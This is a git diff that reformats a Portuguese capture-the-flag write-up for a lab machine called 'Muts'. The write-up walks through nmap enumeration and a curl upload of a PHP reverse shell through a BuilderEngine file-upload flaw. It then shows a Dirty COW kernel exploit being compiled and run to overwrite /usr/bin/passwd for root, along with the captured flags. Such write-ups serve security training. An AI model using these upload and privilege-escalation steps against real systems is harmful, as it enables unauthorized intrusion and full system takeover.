@@ -1,6 +1,7 @@
-CyberCup - Muts
-
-# CyberCup - Muts
+---
+title: Muts
+category: FIAP CyberCup
+---
 
 ## Enumeration
 
@@ -8,7 +9,7 @@ CyberCup - Muts
 
 - Após ligar a maquina, executado os comandos abaixo para enumeração da VM
 
-```
+```plaintext
 # Nmap 7.80 scan initiated Sat Jun 27 18:38:54 2020 as: nmap -sC -sV -Pn -oA quick 10.2.0.11
 Nmap scan report for 10.2.0.11                                                                                       
 Host is up (0.0029s latency).
@@ -119,7 +120,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ```
 
-###  80/TCP
+### 80/TCP
 
 Ao acessar porta 80, identificado que temos uma instalação do BuilderEngine em modo de manutenção
 
@@ -127,7 +128,7 @@ Ao acessar porta 80, identificado que temos uma instalação do BuilderEngine em
 
 - Ao buscar este produto no searchsploit, encontrado vulnerabilidade de **Arbitrary File Upload**
 
-```
+```plaintext
 zurc@kali:/dcruz/fiap/cybercup/muts/scan$ searchsploit builderengine
 ---------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                    |  Path
@@ -140,96 +141,89 @@ BuilderEngine 3.5.0 - Arbitrary File Upload and Execution (Metasploit)          
 
 - Ao verificar o exploit, visto que apenas é necessário fazer o upload do PHP utilizando o comando curl passando o arquivo do payload do shell reverso (pentestmonkey)
 
-  ```
-  curl -F 'files=@shell.php' http://10.2.0.11//themes/dashboard/assets/plugins/jquery-file-upload/server/php/
-  {"files":[{"name":"shell.php","size":3460,"type":"application\/octet-stream","url":"http:\/\/10.2.0.11\/\/files\/shell.php","deleteUrl":"http:\/\/10.2.0.11\/themes\/dashboard\/assets\/plugins\/jquery-file-upload\/server\/php\/?file=shell.php","deleteType":"DELETE"}]}
-  
-  ```
+```bash
+curl -F 'files=@shell.php' http://10.2.0.11//themes/dashboard/assets/plugins/jquery-file-upload/server/php/
+{"files":[{"name":"shell.php","size":3460,"type":"application\/octet-stream","url":"http:\/\/10.2.0.11\/\/files\/shell.php","deleteUrl":"http:\/\/10.2.0.11\/themes\/dashboard\/assets\/plugins\/jquery-file-upload\/server\/php\/?file=shell.php","deleteType":"DELETE"}]}
+
+```
   
 - Executado arquivo e obtido shell reverso. Após isso obtido a flag de user.txt
 
-  ```
-  www-data@Muts:/var/www$ cat user.txt 
-  bfbb7e6e6e88d9ae66848b9aeac6b289
-  ```
+```plaintext
+www-data@Muts:/var/www$ cat user.txt 
+bfbb7e6e6e88d9ae66848b9aeac6b289
+```
 
-  ## Escalação de privilégios
+## Escalação de privilégios
 
 - A partir da maquina, executado LinEnum.sh e visto que existe a possibilidade de escalar privilégios utilizando o /bin/cp.
 
 - Entretanto como nao temos a senha do user www-data, optamos por um exploit de kernel e a partir do **linux-exploit-suggester.sh** vimos que é passivel de epxloração usando dirty cow
 
-  ```
-  Available information:                                                                                                                                                                                                                                                                                                                         
-  Kernel version: 3.13.0                                    
-  Architecture: i686                                                                                                   
-  Distribution: ubuntu                                                                                                 
-  Distribution version: 14.04                                                                                          
-  Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed                                        
-  Package listing: from current OS                                                                                     
-                                                                                                                       
-  Searching among:                                          
-                                                                                                                       
-  74 kernel space exploits                                  
-  45 user space exploits                                    
-                                                            
-  Possible Exploits:                                                                                                   
-                                                                                                                       
-  cat: write error: Broken pipe                             
-  cat: write error: Broken pipe                                                                                        
-  cat: write error: Broken pipe                             
-  cat: write error: Broken pipe                             
-  cat: write error: Broken pipe                                                                                        
-  [+] [CVE-2016-5195] dirtycow                              
-                                                            
-     Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails                                                                                                                                                       
-     Exposure: highly probable                              
-     Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
-     Download URL: https://www.exploit-db.com/download/40611                                                           
-     Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh   
-  ```
+```plaintext
+Available information:                                                                                                                                                                                                                                                                                                                         
+Kernel version: 3.13.0                                    
+Architecture: i686                                                                                                   
+Distribution: ubuntu                                                                                                 
+Distribution version: 14.04                                                                                          
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed                                        
+Package listing: from current OS                                                                                     
+                                                                                                                      
+Searching among:                                          
+                                                                                                                      
+74 kernel space exploits                                  
+45 user space exploits                                    
+                                                          
+Possible Exploits:                                                                                                   
+                                                                                                                      
+cat: write error: Broken pipe                             
+cat: write error: Broken pipe                                                                                        
+cat: write error: Broken pipe                             
+cat: write error: Broken pipe                             
+cat: write error: Broken pipe                                                                                        
+[+] [CVE-2016-5195] dirtycow                              
+                                                          
+    Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails                                                                                                                                                       
+    Exposure: highly probable                              
+    Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
+    Download URL: https://www.exploit-db.com/download/40611                                                           
+    Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh   
+```
   
-- ```
-  www-data@Muts:/tmp$ gcc agoravai.c -o agoravai -pthread
-  agoravai.c: In function 'procselfmemThread':
-  agoravai.c:99:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
-           lseek(f,map,SEEK_SET);
-           ^
-  In file included from agoravai.c:27:0:
-  /usr/include/unistd.h:334:16: note: expected '__off_t' but argument is of type 'void *'
-   extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
-                  ^
-  agoravai.c: In function 'main':
-  agoravai.c:142:5: warning: format '%d' expects argument of type 'int', but argument 2 has type '__off_t' [-Wformat=]
-       printf("Size of binary: %d\n", st.st_size);
-       ^
-  www-data@Muts:/tmp$               
-  www-data@Muts:/tmp$ ./agoravai 
-  DirtyCow root privilege escalation
-  Backing up /usr/bin/passwd to /tmp/bak
-  Size of binary: 45420
-  Racing, this may take a while..
-  thread stopped
-  thread stopped
-  /usr/bin/passwd overwritten
-  Popping root shell.
-  Don't forget to restore /tmp/bak
-  root@Muts:/tmp# id
-  uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
-  root@Muts:/tmp# 
-  ```
+```plaintext
+www-data@Muts:/tmp$ gcc agoravai.c -o agoravai -pthread
+agoravai.c: In function 'procselfmemThread':
+agoravai.c:99:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
+          lseek(f,map,SEEK_SET);
+          ^
+In file included from agoravai.c:27:0:
+/usr/include/unistd.h:334:16: note: expected '__off_t' but argument is of type 'void *'
+  extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
+                ^
+agoravai.c: In function 'main':
+agoravai.c:142:5: warning: format '%d' expects argument of type 'int', but argument 2 has type '__off_t' [-Wformat=]
+      printf("Size of binary: %d\n", st.st_size);
+      ^
+www-data@Muts:/tmp$               
+www-data@Muts:/tmp$ ./agoravai 
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd to /tmp/bak
+Size of binary: 45420
+Racing, this may take a while..
+thread stopped
+thread stopped
+/usr/bin/passwd overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+root@Muts:/tmp# id
+uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
+root@Muts:/tmp# 
+```
 
 - Uma vez como root, obtido root.txt
 
-```
+```plaintext
 root@Muts:/tmp# cat /root/root.txt
 cat /root/root.txt
 a10828bee17db751de4b936614558305
-
 ```
-
- 
-
- 
-
- 
